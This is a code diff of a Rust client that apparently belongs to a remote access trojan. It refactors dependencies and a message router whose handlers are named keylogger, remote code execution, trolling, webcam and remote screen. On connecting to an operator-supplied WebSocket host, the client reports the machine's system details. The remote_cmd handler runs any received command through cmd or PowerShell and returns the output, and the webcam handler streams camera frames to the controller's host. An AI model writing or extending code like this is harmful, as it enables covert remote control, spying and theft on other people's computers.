@@ -13,12 +13,18 @@ tungstenite = "0.23.0"
 tokio = { version = "1.39.1", features = ["full"] }
 sysinfo = "0.31.2"
 url = "2.5.2"
-winapi = { version = "0.3.9", features = ["sysinfoapi", "winbase", "winnt", "winreg", "minwindef"] }
+winapi = { version = "0.3.9", features = [
+    "sysinfoapi",
+    "winbase",
+    "winnt",
+    "winreg",
+    "minwindef",
+] }
 scrap = "0.5.0"
 lazy_static = "1.5.0"
-opencv = "0.92.2"
+# opencv = "0.92.2"
 win_desktop_duplication = "0.10.11"
-
+anyhow = "1.0.98"
 
 ```
 
@@ -140,13 +146,10 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "320119579fcad9c21884f5c4861d16174d0e06250625266f50fe6898340abefa"
 
 [[package]]
-name = "aho-corasick"
-version = "1.1.3"
+name = "anyhow"
+version = "1.0.98"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "8e60d3430d3a69478ad0993f19238d2df97c507009a52b3c10addcd7f6bcb916"
-dependencies = [
- "memchr",
-]
+checksum = "e16d2d3311acee920a9eb8d33b8cbc1787ce4a264e85f964c2404b969bdcd487"
 
 [[package]]
 name = "autocfg"
@@ -203,17 +206,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "d71b6127be86fdcfddb610f7182ac57211d4b18a3e9c82eb2d17662f2227ad6a"
 
 [[package]]
-name = "cc"
-version = "1.2.27"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "d487aa071b5f64da6f19a3e848e3578944b726ee5a4854b82172f02aa876bfdc"
-dependencies = [
- "jobserver",
- "libc",
- "shlex",
-]
-
-[[package]]
 name = "cfg-if"
 version = "0.1.10"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -226,31 +218,11 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "9555578bc9e57714c812a1f84e4fc5b4d21fcb063490c624de019f7464c91268"
 
 [[package]]
-name = "clang"
-version = "2.0.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "84c044c781163c001b913cd018fc95a628c50d0d2dfea8bca77dad71edb16e37"
-dependencies = [
- "clang-sys",
- "libc",
-]
-
-[[package]]
-name = "clang-sys"
-version = "1.8.1"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "0b023947811758c97c59bf9d1c188fd619ad4718dcaa767947df1cadb14f39f4"
-dependencies = [
- "glob",
- "libc",
-]
-
-[[package]]
 name = "client"
 version = "0.1.0"
 dependencies = [
+ "anyhow",
  "lazy_static",
- "opencv",
  "scrap",
  "sysinfo",
  "tokio",
@@ -336,12 +308,6 @@ dependencies = [
  "quote",
  "syn",
 ]
-
-[[package]]
-name = "dunce"
-version = "1.0.5"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "92773504d58c093f6de2459af4af33faa518c13451eb8f2b5698ed3d36e7c813"
 
 [[package]]
 name = "either"
@@ -471,19 +437,7 @@ checksum = "335ff9f135e4384c8150d6f27c6daed433577f86b4750418338c01a1a2528592"
 dependencies = [
  "cfg-if 1.0.1",
  "libc",
- "wasi 0.11.1+wasi-snapshot-preview1",
-]
-
-[[package]]
-name = "getrandom"
-version = "0.3.3"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "26145e563e54f2cadc477553f1ec5ee650b00862f0a58bcd12cbdc5f0ea2d2f4"
-dependencies = [
- "cfg-if 1.0.1",
- "libc",
- "r-efi",
- "wasi 0.14.2+wasi-0.2.4",
+ "wasi",
 ]
 
 [[package]]
@@ -491,12 +445,6 @@ name = "gimli"
 version = "0.31.1"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "07e28edb80900c19c28f1072f2e8aeca7fa06b23cd4169cefe1af5aa3260783f"
-
-[[package]]
-name = "glob"
-version = "0.3.2"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "a8d1add55171497b4705a648c6b583acafb01d58050a51727785f0b2c8e0a2b2"
 
 [[package]]
 name = "http"
@@ -629,16 +577,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "4a5f13b858c8d314ee3e8f639011f7ccefe71f97f96e50151fb991f267928e2c"
 
 [[package]]
-name = "jobserver"
-version = "0.1.33"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "38f262f097c174adebe41eb73d66ae9c06b2844fb0da69969647bbddd9b0538a"
-dependencies = [
- "getrandom 0.3.3",
- "libc",
-]
-
-[[package]]
 name = "lazy_static"
 version = "1.5.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -694,7 +632,7 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "78bed444cc8a2160f01cbcf811ef18cac863ad68ae8ca62092e8db51d51c761c"
 dependencies = [
  "libc",
- "wasi 0.11.1+wasi-snapshot-preview1",
+ "wasi",
  "windows-sys 0.59.0",
 ]
 
@@ -708,61 +646,12 @@ dependencies = [
 ]
 
 [[package]]
-name = "num-traits"
-version = "0.2.19"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "071dfc062690e90b734c0b2273ce72ad0ffa95f0c74596bc250dcfd960262841"
-dependencies = [
- "autocfg",
-]
-
-[[package]]
 name = "object"
 version = "0.36.7"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "62948e14d923ea95ea2c7c86c71013138b66525b86bdc08d2dcc262bdb497b87"
 dependencies = [
  "memchr",
-]
-
-[[package]]
-name = "once_cell"
-version = "1.21.3"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "42f5e15c9953c5e4ccceeb2e7382a716482c34515315f7b03532b8b4e8393d2d"
-
-[[package]]
-name = "opencv"
-version = "0.92.3"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "c01f7646f18911737aa3d721dec4a0060d044ef1224eb54a439ae6fa716ccb86"
-dependencies = [
- "cc",
- "dunce",
- "jobserver",
- "libc",
- "num-traits",
- "once_cell",
- "opencv-binding-generator",
- "pkg-config",
- "semver",
- "shlex",
- "vcpkg",
- "windows 0.58.0",
-]
-
-[[package]]
-name = "opencv-binding-generator"
-version = "0.90.2"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "c238fe1b9e78bf939dfab14184464a25acaf42d634fd502dc9ccc445f5bad1b9"
-dependencies = [
- "clang",
- "clang-sys",
- "dunce",
- "once_cell",
- "percent-encoding",
- "regex",
 ]
 
 [[package]]
@@ -807,12 +696,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "8b870d8c151b6f2fb93e84a13146138f05d02ed11c7e7c54f8826aaaf7c9f184"
 
 [[package]]
-name = "pkg-config"
-version = "0.3.32"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "7edddbd0b52d732b21ad9a5fab5c704c14cd949e5e9a1ec5929a24fded1b904c"
-
-[[package]]
 name = "potential_utf"
 version = "0.1.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -849,12 +732,6 @@ dependencies = [
 ]
 
 [[package]]
-name = "r-efi"
-version = "5.3.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "69cdb34c158ceb288df11e18b4bd39de994f6657d83847bdffdbd7f346754b0f"
-
-[[package]]
 name = "rand"
 version = "0.8.5"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -881,7 +758,7 @@ version = "0.6.4"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "ec0be4795e2f6a28069bec0b5ff3e2ac9bafc99e6a9a7dc3547996c5c816922c"
 dependencies = [
- "getrandom 0.2.16",
+ "getrandom",
 ]
 
 [[package]]
@@ -914,35 +791,6 @@ dependencies = [
 ]
 
 [[package]]
-name = "regex"
-version = "1.11.1"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "b544ef1b4eac5dc2db33ea63606ae9ffcfac26c1416a2806ae0bf5f56b201191"
-dependencies = [
- "aho-corasick",
- "memchr",
- "regex-automata",
- "regex-syntax",
-]
-
-[[package]]
-name = "regex-automata"
-version = "0.4.9"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "809e8dc61f6de73b46c85f4c96486310fe304c434cfa43669d7b40f711150908"
-dependencies = [
- "aho-corasick",
- "memchr",
- "regex-syntax",
-]
-
-[[package]]
-name = "regex-syntax"
-version = "0.8.5"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "2b15c43186be67a4fd63bee50d0303afffcef381492ebe2c5d87f324e1b8815c"
-
-[[package]]
 name = "rustc-demangle"
 version = "0.1.25"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -965,12 +813,6 @@ dependencies = [
  "libc",
  "winapi 0.2.8",
 ]
-
-[[package]]
-name = "semver"
-version = "1.0.26"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "56e6fa9c48d24d85fb3de5ad847117517440f6beceb7798af16b4a87d616b8d0"
 
 [[package]]
 name = "serde"
@@ -1002,12 +844,6 @@ dependencies = [
  "cpufeatures",
  "digest",
 ]
-
-[[package]]
-name = "shlex"
-version = "1.3.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "0fda2ff0d084019ba4d7c6f371c95d8fd75ce3524c3cb8fb653a3023f6323e64"
 
 [[package]]
 name = "signal-hook-registry"
@@ -1079,7 +915,7 @@ dependencies = [
  "memchr",
  "ntapi",
  "rayon",
- "windows 0.57.0",
+ "windows",
 ]
 
 [[package]]
@@ -1195,12 +1031,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "b6c140620e7ffbb22c2dee59cafe6084a59b5ffc27a8859a5f0d494b5d52b6be"
 
 [[package]]
-name = "vcpkg"
-version = "0.2.15"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "accd4ea62f7bb7a82fe23066fb0957d48ef677f6eeb8215f372f52e48bb32426"
-
-[[package]]
 name = "version_check"
 version = "0.9.5"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -1213,15 +1043,6 @@ source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "ccf3ec651a847eb01de73ccad15eb7d99f80485de043efb2f370cd654f4ea44b"
 
 [[package]]
-name = "wasi"
-version = "0.14.2+wasi-0.2.4"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "9683f9a5a998d873c0d21fcbe3c083009670149a8fab228644b8bd36b2c48cb3"
-dependencies = [
- "wit-bindgen-rt",
-]
-
-[[package]]
 name = "win_desktop_duplication"
 version = "0.10.11"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -1230,7 +1051,7 @@ dependencies = [
  "futures",
  "log",
  "tokio",
- "windows 0.57.0",
+ "windows",
 ]
 
 [[package]]
@@ -1267,17 +1088,7 @@ version = "0.57.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "12342cb4d8e3b046f3d80effd474a7a02447231330ef77d71daa6fbc40681143"
 dependencies = [
- "windows-core 0.57.0",
- "windows-targets",
-]
-
-[[package]]
-name = "windows"
-version = "0.58.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "dd04d41d93c4992d421894c18c8b43496aa748dd4c081bac0dc93eb0489272b6"
-dependencies = [
- "windows-core 0.58.0",
+ "windows-core",
  "windows-targets",
 ]
 
@@ -1287,22 +1098,9 @@ version = "0.57.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "d2ed2439a290666cd67ecce2b0ffaad89c2a56b976b736e6ece670297897832d"
 dependencies = [
- "windows-implement 0.57.0",
- "windows-interface 0.57.0",
- "windows-result 0.1.2",
- "windows-targets",
-]
-
-[[package]]
-name = "windows-core"
-version = "0.58.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "6ba6d44ec8c2591c134257ce647b7ea6b20335bf6379a27dac5f1641fcf59f99"
-dependencies = [
- "windows-implement 0.58.0",
- "windows-interface 0.58.0",
- "windows-result 0.2.0",
- "windows-strings",
+ "windows-implement",
+ "windows-interface",
+ "windows-result",
  "windows-targets",
 ]
 
@@ -1311,17 +1109,6 @@ name = "windows-implement"
 version = "0.57.0"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "9107ddc059d5b6fbfbffdfa7a7fe3e22a226def0b2608f72e9d552763d3e1ad7"
-dependencies = [
- "proc-macro2",
- "quote",
- "syn",
-]
-
-[[package]]
-name = "windows-implement"
-version = "0.58.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "2bbd5b46c938e506ecbce286b6628a02171d56153ba733b6c741fc627ec9579b"
 dependencies = [
  "proc-macro2",
  "quote",
@@ -1340,41 +1127,11 @@ dependencies = [
 ]
 
 [[package]]
-name = "windows-interface"
-version = "0.58.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "053c4c462dc91d3b1504c6fe5a726dd15e216ba718e84a0e46a88fbe5ded3515"
-dependencies = [
- "proc-macro2",
- "quote",
- "syn",
-]
-
-[[package]]
 name = "windows-result"
 version = "0.1.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "5e383302e8ec8515204254685643de10811af0ed97ea37210dc26fb0032647f8"
 dependencies = [
- "windows-targets",
-]
-
-[[package]]
-name = "windows-result"
-version = "0.2.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "1d1043d8214f791817bab27572aaa8af63732e11bf84aa21a45a78d6c317ae0e"
-dependencies = [
- "windows-targets",
-]
-
-[[package]]
-name = "windows-strings"
-version = "0.1.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "4cd9b125c486025df0eabcb585e62173c6c9eddcec5d117d3b6e8c30e2ee4d10"
-dependencies = [
- "windows-result 0.2.0",
  "windows-targets",
 ]
 
@@ -1459,15 +1216,6 @@ name = "windows_x86_64_msvc"
 version = "0.52.6"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "589f6da84c646204747d1270a2a5661ea66ed1cced2631d546fdfb155959f9ec"
-
-[[package]]
-name = "wit-bindgen-rt"
-version = "0.39.0"
-source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "6f42320e61fe2cfd34354ecb597f86f413484a798ba44a8ca1165c58d42da6c1"
-dependencies = [
- "bitflags",
-]
 
 [[package]]
 name = "writeable"
@@ -1776,76 +1524,74 @@ use std::process::Command;
 use sysinfo::System;
 
 pub fn is_valid_ip(ip: &str) -> bool {
-	if ip == "localhost" { return true; }
-	ip.split('.').filter_map(|s| s.parse::<u8>().ok()).count() == 4 && !ip.contains("..")
+    if ip == "localhost" {
+        return true;
+    }
+    ip.split('.').filter_map(|s| s.parse::<u8>().ok()).count() == 4 && !ip.contains("..")
 }
-
 
 pub fn is_port_valid(port: &str) -> bool {
-	(0..=65535).contains(&port.parse::<i32>().unwrap())
+    (0..=65535).contains(&port.parse::<i32>().unwrap())
 }
 
-
 pub struct SystemInformation {
-	host_name: String,
-	os_version: String,
-	long_os_version: String,
-	kernel_version: String,
-	cpu_model: String,
-	gpu_models: Vec<String>,
-	memory_total: u64,
+    host_name: String,
+    os_version: String,
+    long_os_version: String,
+    kernel_version: String,
+    cpu_model: String,
+    gpu_models: Vec<String>,
+    memory_total: u64,
 }
 
 impl SystemInformation {
-	pub fn get() -> SystemInformation {
-		let mut sys = System::new_all();
-		sys.refresh_all();
+    pub fn get() -> SystemInformation {
+        let mut sys = System::new_all();
+        sys.refresh_all();
 
-		SystemInformation {
-			host_name: System::host_name().unwrap_or("Unknown".into()),
-			os_version: System::os_version().unwrap_or("Unknown".into()),
-			long_os_version: System::long_os_version().unwrap_or("Unknown".into()),
-			kernel_version: System::kernel_version().unwrap_or("Unknown".into()),
-			cpu_model: sys.cpus()[0].brand().to_string().trim().to_string(),
-			gpu_models: get_gpu_models(),
-			memory_total: sys.total_memory(),
-		}
-	}
+        SystemInformation {
+            host_name: System::host_name().unwrap_or("Unknown".into()),
+            os_version: System::os_version().unwrap_or("Unknown".into()),
+            long_os_version: System::long_os_version().unwrap_or("Unknown".into()),
+            kernel_version: System::kernel_version().unwrap_or("Unknown".into()),
+            cpu_model: sys.cpus()[0].brand().to_string().trim().to_string(),
+            gpu_models: get_gpu_models(),
+            memory_total: sys.total_memory(),
+        }
+    }
 
-	/* Expected format 
-		"HostName, OS short, OS Long, Kernel Version, CPU Model, {GPU Model 1, GPU Model 2}, Total Memory"
-	 */
+    /* Expected format
+       "HostName, OS short, OS Long, Kernel Version, CPU Model, {GPU Model 1, GPU Model 2}, Total Memory"
+    */
 
-	pub fn to_string(&self) -> String {
-		let gpus = format!("{{{}}}", self.gpu_models.join(", "));
-		format!(
-			"{}, {}, {}, {}, {}, {}, {}",
-			self.host_name,
-			self.os_version,
-			self.long_os_version,
-			self.kernel_version,
-			self.cpu_model,
-			gpus,
-			self.memory_total,
-		)
-	}
+    pub fn to_string(&self) -> String {
+        let gpus = format!("{{{}}}", self.gpu_models.join(", "));
+        format!(
+            "{}, {}, {}, {}, {}, {}, {}",
+            self.host_name,
+            self.os_version,
+            self.long_os_version,
+            self.kernel_version,
+            self.cpu_model,
+            gpus,
+            self.memory_total,
+        )
+    }
 }
 
 fn get_gpu_models() -> Vec<String> {
-	let output = Command::new("powershell")
-		.args(["-Command", "(Get-WmiObject Win32_VideoController).Name"])
-		.output();
+    let output = Command::new("powershell")
+        .args(["-Command", "(Get-WmiObject Win32_VideoController).Name"])
+        .output();
 
-	if let Ok(output) = output {
-		let output_str = String::from_utf8_lossy(&output.stdout);
-		output_str
-			.lines()
-			.map(|s| s.trim().to_string())
-			.collect()
-	} else {
-		vec!["Unknown".to_string()]
-	}
+    if let Ok(output) = output {
+        let output_str = String::from_utf8_lossy(&output.stdout);
+        output_str.lines().map(|s| s.trim().to_string()).collect()
+    } else {
+        vec!["Unknown".to_string()]
+    }
 }
+
 ```
 
 ---
@@ -1859,17 +1605,16 @@ use std::net::TcpStream;
 use std::panic;
 use std::str::FromStr;
 
-use tungstenite::{connect, WebSocket};
 use tungstenite::stream::MaybeTlsStream;
+use tungstenite::{connect, WebSocket};
 
-use crate::router::{handle_message, MessageType};
+use crate::router::handle_message;
 use crate::utils::SystemInformation;
 
-mod utils;
-mod router;
 mod handlers;
+mod router;
+mod utils;
 pub type Socket = WebSocket<MaybeTlsStream<TcpStream>>;
-
 
 /* Ports
 4040 - Handling one-time messages
@@ -1877,47 +1622,47 @@ pub type Socket = WebSocket<MaybeTlsStream<TcpStream>>;
 4042 - Desktop Streaming
  */
 
-
 #[derive(Clone)]
 struct Connection {
-	ip: String,
-	port: i32,
+    ip: String,
+    port: i32,
 }
 fn main() {
-	let args = std::env::args().collect::<Vec<String>>();
-	let connection = Connection {
-		ip: args.get(1).unwrap().to_owned(),
-		port: i32::from_str(args.get(2).unwrap()).unwrap(),
-	};
-	connect_with_host(connection);
+    let args = std::env::args().collect::<Vec<String>>();
+    let connection = Connection {
+        ip: args.get(1).unwrap().to_owned(),
+        port: i32::from_str(args.get(2).unwrap()).unwrap(),
+    };
+    connect_with_host(connection);
 }
 
 fn connect_with_host(connection: Connection) {
-	let (mut socket, _response) = connect(format!("ws://{}:{}", connection.ip, connection.port)).expect("Can't connect");
-	let sysinfo = SystemInformation::get().to_string();
-	socket.send(sysinfo.into()).unwrap();
+    let (mut socket, _response) =
+        connect(format!("ws://{}:{}", connection.ip, connection.port)).expect("Can't connect");
+    let sysinfo = SystemInformation::get().to_string();
+    socket.send(sysinfo.into()).unwrap();
 
-	loop {
-		let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
-			read_messages(&mut socket, connection.clone())
-		}));
-		if res.is_err() {
-			continue
-		}
-	}
+    loop {
+        let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
+            read_messages(&mut socket, connection.clone())
+        }));
+        if res.is_err() {
+            continue;
+        }
+    }
 }
 
-fn read_messages(socket: &mut Socket, connection: Connection) {
-	loop {
-		let msg = socket.read();
-		if let Ok(msg) = msg {
-			let text = msg.into_text().unwrap();
-			let bytes = text.as_bytes();
-			let message_type = MessageType::from_char(bytes[0] as char).expect("Invalid message type");
-			handle_message(message_type, &bytes[1..], socket, &connection);
-		}
-	}
+fn read_messages(socket: &mut Socket, connection: Connection) -> anyhow::Result<()> {
+    loop {
+        let msg = socket.read();
+        if let Ok(msg) = msg {
+            let text = msg.into_text().unwrap();
+            let bytes = text.as_bytes();
+            _ = handle_message(bytes, socket, &connection);
+        }
+    }
 }
+
 ```
 
 ---
@@ -1925,56 +1670,55 @@ fn read_messages(socket: &mut Socket, connection: Connection) {
 ## File: `src/router.rs`
 
 ```rs
-use crate::{Connection, handlers::audio::handle_audio, handlers::chat::handle_chat, handlers::file_system::handle_file_system, handlers::keylogger::handle_keylogger, handlers::remote_cmd::handle_remote_cmd, handlers::remote_code_execution::handle_remote_code_execution, handlers::remote_screen::handle_remote_screen, handlers::task_manager::handle_task_manager, handlers::trolling::handle_trolling, handlers::webcam, Socket};
+use std::collections::HashMap;
 
-#[derive(Eq, Hash, PartialEq, Debug)]
-pub enum MessageType {
-	FileSystem,
-	RemoteScreen,
-	Trolling,
-	RemoteCMD,
-	Audio,
-	TaskManager,
-	Keylogger,
-	Chat,
-	RemoteCodeExecution,
-	Webcam,
+use lazy_static::lazy_static;
+
+use crate::{
+    handlers::{
+        audio::Audio,
+        chat::Chat,
+        file_system::FileSystem,
+        func::{Context, Function, HandlerFn},
+        keylogger::KeyLogger,
+        remote_cmd::RemoteCMD,
+        remote_code_execution::RemoteCodeExecution,
+        remote_screen::RemoteScreen,
+        task_manager::TaskManager,
+        trolling::Trolling, // webcam,
+    },
+    Connection, Socket,
+};
+
+lazy_static! {
+    static ref B_TO_HANDLER: HashMap<u8, HandlerFn> = {
+        let mut m = HashMap::new();
+        m.insert(0, FileSystem::handler as HandlerFn);
+        m.insert(1, RemoteScreen::handler as HandlerFn);
+        m.insert(2, Trolling::handler as HandlerFn);
+        m.insert(3, RemoteCMD::handler as HandlerFn);
+        m.insert(4, Audio::handler as HandlerFn);
+        m.insert(5, TaskManager::handler as HandlerFn);
+        m.insert(6, KeyLogger::handler as HandlerFn);
+        m.insert(7, Chat::handler as HandlerFn);
+        m.insert(8, RemoteCodeExecution::handler as HandlerFn);
+        // m.insert(9, Webcam::handler as HandlerFn);
+
+        m
+    };
 }
 
-// Using char so that we can get gazillion-bazillion variations in 1 byte
+pub fn handle_message(
+    bytes: &[u8],
+    socket: &mut Socket,
+    connection: &Connection,
+) -> anyhow::Result<()> {
+    let mut ctx = Context::from(socket, connection);
+    let function_handler = B_TO_HANDLER
+        .get(&bytes[0])
+        .ok_or_else(|| anyhow::anyhow!("No such function, recheck first byte of the request"))?;
 
-impl MessageType {
-	pub fn from_char(value: char) -> Option<MessageType> {
-		match value {
-			'0' => Some(MessageType::FileSystem),
-			'1' => Some(MessageType::RemoteScreen),
-			'2' => Some(MessageType::Trolling),
-			'3' => Some(MessageType::RemoteCMD),
-			'4' => Some(MessageType::Audio),
-			'5' => Some(MessageType::TaskManager),
-			'6' => Some(MessageType::Keylogger),
-			'7' => Some(MessageType::Chat),
-			'8' => Some(MessageType::RemoteCodeExecution),
-			'9' => Some(MessageType::Webcam),
-			_ => None,
-		}
-	}
-}
-
-pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut Socket, connection: &Connection) {
-	dbg!(&payload,&message);
-	match message {
-		MessageType::RemoteScreen => handle_remote_screen(payload, connection), // Create new connection instead of passing existing websocket
-		MessageType::FileSystem => handle_file_system(payload, socket),
-		MessageType::Trolling => handle_trolling(payload),
-		MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
-		MessageType::Audio => handle_audio(payload),
-		MessageType::TaskManager => handle_task_manager(payload),
-		MessageType::Keylogger => handle_keylogger(payload),
-		MessageType::Chat => handle_chat(payload, connection),
-		MessageType::RemoteCodeExecution => handle_remote_code_execution(payload),
-		MessageType::Webcam => webcam::handle_webcam(connection)
-	}
+    function_handler(bytes, &mut ctx)
 }
 
 ```
@@ -1984,10 +1728,14 @@ pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut Socket,
 ## File: `src/handlers/audio.rs`
 
 ```rs
-pub fn handle_audio(payload: &[u8]) {
-	// Handle audio functionality
-}
+use crate::handlers::func::Function;
 
+pub struct Audio;
+impl Function for Audio {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!()
+    }
+}
 
 ```
 
@@ -1996,23 +1744,33 @@ pub fn handle_audio(payload: &[u8]) {
 ## File: `src/handlers/remote_cmd.rs`
 
 ```rs
-use std::net::TcpStream;
 use std::process::Command;
-use tungstenite::stream::MaybeTlsStream;
-use tungstenite::{Message, WebSocket};
 
-pub(crate) fn handle_remote_cmd(payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
-	// Executes CMD if first byte of payload is 0 or anything
-	// Executes PowerShell command if first byte == 1
-	
-	let cmd = String::from_utf8_lossy(&payload[1..]);
-	let mut mode = ("cmd","/C");
-	if payload[0] == b'1' {
-		mode = ("powershell", "-Command");
-	};
-	let output = Command::new(mode.0).arg(mode.1).arg(&*cmd).output().expect("Failed to execute command");
-	let response = String::from_utf8_lossy(&output.stdout);
-	socket.send(Message::from(response.to_string())).expect("Failed to send response");
+use tungstenite::Message;
+
+use crate::handlers::func::{Context, Function};
+
+pub struct RemoteCMD;
+
+impl Function for RemoteCMD {
+    fn handler(payload: &[u8], ctx: &mut Context) -> anyhow::Result<()> {
+        let cmd = String::from_utf8_lossy(&payload[1..]);
+        let mut mode = ("cmd", "/C");
+        if payload[0] == b'1' {
+            mode = ("powershell", "-Command");
+        };
+        let output = Command::new(mode.0)
+            .arg(mode.1)
+            .arg(&*cmd)
+            .output()
+            .expect("Failed to execute command");
+        let response = String::from_utf8_lossy(&output.stdout);
+
+        ctx.socket
+            .send(Message::from(response.to_string()))
+            .expect("Failed to send response");
+        Ok(())
+    }
 }
 
 ```
@@ -2022,44 +1780,58 @@ pub(crate) fn handle_remote_cmd(payload: &[u8], socket: &mut WebSocket<MaybeTlsS
 ## File: `src/handlers/webcam.rs`
 
 ```rs
-use opencv::prelude::*;
-use opencv::videoio;
 use tungstenite::{connect, Message};
 
-use crate::Connection;
+// use opencv::prelude::*;
+// use opencv::videoio;
 
-pub fn handle_webcam(connection: &Connection) {
-	let url = format!("ws://{}:4043", connection.ip);
-	let (mut socket, _response) = connect(&url).unwrap();
-	println!("Socket connected");
-	
-	// Create new thread so it doesn't block
-	std::thread::spawn(move || {
-		let mut cam = match videoio::VideoCapture::new(0, videoio::CAP_ANY) {
-			Ok(c) => c,
-			Err(_) => {
-				socket.send("Failed to open camera".into()).unwrap();
-				return;
-			}
-		};
+use crate::handlers::func::Function;
+struct Webcam;
+impl Function for Webcam {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!();
 
-		if !videoio::VideoCapture::is_opened(&cam).unwrap() {
-			socket.send("Failed to open default camera.".into()).unwrap();
-			return;
-		}
+        let url = format!("ws://{}:4043", ctx.conn.ip);
+        let (mut socket, _response) = connect(&url).unwrap();
+        println!("Socket connected");
 
-		loop {
-			let mut frame = Mat::default();
-			if !cam.read(&mut frame).unwrap() {
-				socket.send("Failed to capture frame.".into()).unwrap();
-				break; 
-			}
+        // Create new thread so it doesn't block
+        std::thread::spawn(move || {
+            let mut cam = match videoio::VideoCapture::new(0, videoio::CAP_ANY) {
+                Ok(c) => c,
+                Err(_) => {
+                    socket.send("Failed to open camera".into()).unwrap();
+                    return;
+                }
+            };
 
-			let mut buf = opencv::core::Vector::new();
-			opencv::imgcodecs::imencode(".jpg", &frame, &mut buf, &opencv::core::Vector::<i32>::new()).unwrap();
-			socket.send(Message::Binary(buf.into())).unwrap();
-		}
-	});
+            if !videoio::VideoCapture::is_opened(&cam).unwrap() {
+                socket
+                    .send("Failed to open default camera.".into())
+                    .unwrap();
+                return;
+            }
+
+            loop {
+                let mut frame = Mat::default();
+                if !cam.read(&mut frame).unwrap() {
+                    socket.send("Failed to capture frame.".into()).unwrap();
+                    break;
+                }
+
+                let mut buf = opencv::core::Vector::new();
+                opencv::imgcodecs::imencode(
+                    ".jpg",
+                    &frame,
+                    &mut buf,
+                    &opencv::core::Vector::<i32>::new(),
+                )
+                .unwrap();
+                socket.send(Message::Binary(buf.into())).unwrap();
+            }
+        });
+        Ok(())
+    }
 }
 
 ```
@@ -2069,10 +1841,14 @@ pub fn handle_webcam(connection: &Connection) {
 ## File: `src/handlers/task_manager.rs`
 
 ```rs
-pub fn handle_task_manager(payload: &[u8]) {
-	// Handle task manager functionality
-}
+use crate::handlers::func::Function;
 
+pub struct TaskManager;
+impl Function for TaskManager {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!()
+    }
+}
 
 ```
 
@@ -2081,11 +1857,14 @@ pub fn handle_task_manager(payload: &[u8]) {
 ## File: `src/handlers/keylogger.rs`
 
 ```rs
-pub fn handle_keylogger(payload: &[u8]) {
-	// Handle keylogger functionality
+use crate::handlers::func::Function;
+
+pub struct KeyLogger;
+impl Function for KeyLogger {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        todo!()
+    }
 }
-
-
 
 ```
 
@@ -2099,64 +1878,67 @@ use tungstenite::{connect, Message};
 use win_desktop_duplication::*;
 use win_desktop_duplication::{devices::*, tex_reader::*};
 
-use crate::{Connection, Socket};
+use crate::handlers::func::Function;
+use crate::Socket;
 
-pub fn handle_remote_screen(
-	_payload: &[u8],
-	connection: &Connection
-) {
-	let url = format!("ws://{}:4042", connection.ip);
-	let (mut socket, _response) = connect(&url).unwrap();
-	println!("Socket connected");
+pub struct RemoteScreen;
 
-	std::thread::spawn(move || {
